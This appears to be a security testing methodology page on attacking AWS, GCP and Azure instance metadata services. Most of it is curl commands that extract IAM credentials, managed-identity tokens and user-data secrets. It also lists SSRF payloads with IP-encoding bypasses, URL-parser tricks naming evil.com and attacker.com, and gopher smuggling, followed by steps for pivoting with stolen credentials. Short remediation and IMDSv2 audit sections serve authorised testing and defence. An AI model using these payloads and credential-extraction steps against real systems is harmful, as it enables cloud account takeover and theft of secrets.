# Cloud Metadata Service Attacks

## Overview
Cloud metadata service attacks exploit the Instance Metadata Service (IMDS) available on cloud virtual machines to extract sensitive information including temporary credentials, configuration data, user-data scripts, and network details. The metadata endpoint at 169.254.169.254 is a primary target for SSRF-based attacks and post-compromise credential harvesting, often serving as the pivot point for full cloud account takeover.

## Classification
- **CWE:** CWE-918 (Server-Side Request Forgery), CWE-522 (Insufficiently Protected Credentials)
- **OWASP:** A10:2021 - Server-Side Request Forgery, A05:2021 - Security Misconfiguration
- **CVSS Base:** 7.5 - 10.0 (Critical when credentials extracted)
- **MITRE ATT&CK:** T1552.005 (Cloud Instance Metadata API), T1078.004 (Cloud Accounts)

## Detection Methodology

### 1. AWS Instance Metadata Service (IMDS)

#### IMDSv1 (No Authentication Required)
```bash
# Basic metadata enumeration
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/ami-id
curl http://169.254.169.254/latest/meta-data/hostname
curl http://169.254.169.254/latest/meta-data/local-ipv4
curl http://169.254.169.254/latest/meta-data/public-ipv4
curl http://169.254.169.254/latest/meta-data/mac

# Extract IAM credentials (primary target)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# Response contains: AccessKeyId, SecretAccessKey, Token, Expiration

# Extract user-data (may contain startup scripts with secrets)
curl http://169.254.169.254/latest/user-data/

# Network information for pivoting
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/
MAC=$(curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/ | head -1)
curl "http://169.254.169.254/latest/meta-data/network/interfaces/macs/${MAC}vpc-id"
curl "http://169.254.169.254/latest/meta-data/network/interfaces/macs/${MAC}subnet-id"
curl "http://169.254.169.254/latest/meta-data/network/interfaces/macs/${MAC}security-group-ids"

# Instance identity document
curl http://169.254.169.254/latest/dynamic/instance-identity/document
```

#### IMDSv2 (Token Required)
```bash
# Step 1: Obtain a session token (PUT request with TTL header)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token in subsequent requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 mitigations:
# - PUT requests blocked by most SSRF-vulnerable applications
# - Token has a hop limit (default 1) preventing forwarding
# - X-Forwarded-For header causes token rejection
```

#### Check IMDSv2 Enforcement
```bash
# Check if instance requires IMDSv2
aws ec2 describe-instances --instance-id <id> \
  --query 'Reservations[].Instances[].MetadataOptions.{HttpTokens:httpTokens,HttpEndpoint:httpEndpoint,HopLimit:httpPutResponseHopLimit}'

# httpTokens: "required" = IMDSv2 enforced, "optional" = IMDSv1 also works
# httpEndpoint: "enabled"/"disabled"

# Find all instances with IMDSv1 still enabled
aws ec2 describe-instances \
  --query 'Reservations[].Instances[?MetadataOptions.HttpTokens==`optional`].[InstanceId,Tags[?Key==`Name`].Value|[0]]' \
  --output table
```

### 2. GCP Metadata Server
```bash
# GCP requires Metadata-Flavor: Google header
# but this can be set in many SSRF scenarios

# Instance metadata
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true"

# Service account access token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Service account email and scopes
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"

# Project metadata (SSH keys, startup scripts)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script"

# Kubernetes-specific (GKE)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env"
```

### 3. Azure Instance Metadata Service
```bash
# Azure IMDS requires Metadata: true header
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq

# Get managed identity access token
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Token for different resources
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com"

# Instance details
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" | jq

# Network information
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" | jq

# Custom data / user data
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-02-01&format=text" | base64 -d
```

### 4. SSRF-Based Metadata Exploitation
```bash
# Common SSRF payloads targeting metadata services

# Direct access
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IP address encoding bypasses
http://0xa9fea9fe/latest/meta-data/              # Hex
http://2852039166/latest/meta-data/               # Decimal
http://0251.0376.0251.0376/latest/meta-data/      # Octal
http://[::ffff:169.254.169.254]/latest/meta-data/ # IPv6 mapped

# DNS rebinding
# Use a domain that resolves to 169.254.169.254
http://169.254.169.254.nip.io/latest/meta-data/

# URL parser confusion
http://evil.com@169.254.169.254/latest/meta-data/
http://169.254.169.254#@evil.com/latest/meta-data/

# Redirect-based (host an HTTP redirect to metadata)
http://attacker.com/redirect?url=http://169.254.169.254/

# Protocol smuggling (via gopher for non-HTTP metadata access)
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.254.169.254%0A%0A
```

### 5. Credential Extraction and Pivoting
```bash
# After extracting AWS credentials from metadata
export AWS_ACCESS_KEY_ID=<extracted-key>
export AWS_SECRET_ACCESS_KEY=<extracted-secret>
export AWS_SESSION_TOKEN=<extracted-token>

# Verify identity and permissions
aws sts get-caller-identity
enumerate-iam --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY

# After extracting GCP token
TOKEN=<extracted-token>
curl -H "Authorization: Bearer $TOKEN" \
  "https://www.googleapis.com/compute/v1/projects/<project>/zones/<zone>/instances"

# After extracting Azure token
TOKEN=<extracted-token>
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
az login --identity  # If on the compromised VM directly
```

### 6. Container Metadata Services
```bash
# AWS ECS Task Metadata (v4)
curl "$ECS_CONTAINER_METADATA_URI_V4"
curl "$ECS_CONTAINER_METADATA_URI_V4/task"
curl "$ECS_CONTAINER_METADATA_URI_V4/task" | jq '.Containers[].Networks'

# ECS Task Role Credentials
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"

# GKE Metadata (from within a pod)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure Container Instance
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Tool Usage

### IMDSv2 Scanner
```bash
# Check all EC2 instances for IMDSv1 exposure
for id in $(aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text); do
  tokens=$(aws ec2 describe-instances --instance-id $id \
    --query 'Reservations[].Instances[].MetadataOptions.HttpTokens' --output text)
  echo "$id: $tokens"
done
```

### Nuclei
```bash
# SSRF to metadata templates
nuclei -u "http://target.com" -t http/vulnerabilities/ssrf/ -batch
nuclei -u "http://target.com" -t cloud/ -batch
```

### Pacu
```bash
# AWS metadata exploitation module
run ec2__steal_instance_credentials
run ec2__enum
```

## Remediation
1. **AWS:** Enforce IMDSv2 across all EC2 instances, set hop limit to 1, disable IMDS on instances that do not need it, use VPC endpoints for AWS API calls
2. **GCP:** Restrict metadata server access using firewall rules, use Workload Identity for GKE pods instead of node-level service accounts, remove startup scripts containing secrets
3. **Azure:** Use managed identities with minimal permissions, restrict IMDS access via network policies, monitor for anomalous metadata access patterns
4. **Application level:** Validate and sanitize URLs in SSRF-prone functionality, block requests to link-local addresses (169.254.0.0/16), implement URL allowlisting
5. **Network controls:** Use network segmentation to limit metadata access, implement egress filtering, deploy WAF rules to detect metadata URL patterns
6. **Monitoring:** Alert on unusual metadata API access patterns, monitor for credential use from unexpected IP addresses, track EC2 metadata endpoint access in VPC Flow Logs

## Evidence Collection
- Metadata endpoint responses showing accessible data categories
- Extracted temporary credentials (redact after documenting scope)
- User-data scripts containing hardcoded secrets
- IMDSv1/v2 configuration status across instances
- SSRF payloads that successfully reached metadata endpoints
- Credential usage logs showing access from extracted tokens
- Network topology information gathered from metadata
- Post-pivot access demonstration with extracted credentials
